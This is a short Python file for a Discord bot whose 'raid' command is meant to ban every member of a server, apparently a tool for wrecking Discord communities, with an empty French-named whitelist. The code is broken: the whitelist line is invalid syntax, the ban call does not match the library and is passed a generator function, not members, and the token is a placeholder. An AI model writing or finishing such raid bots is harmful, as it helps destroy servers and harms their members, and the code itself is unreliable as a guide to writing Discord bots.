import discord
import asyncio

from discord.ext import commands

bot = commands.Bot(command_prefix='r')

liste blanche= []

def get_all_members_ids(guild):
    for member in guild.members:
        yield member.id





@bot.command()
async def raid(ctx,):
    await bot.ban(get_all_members_ids)
    


bot.run('token')

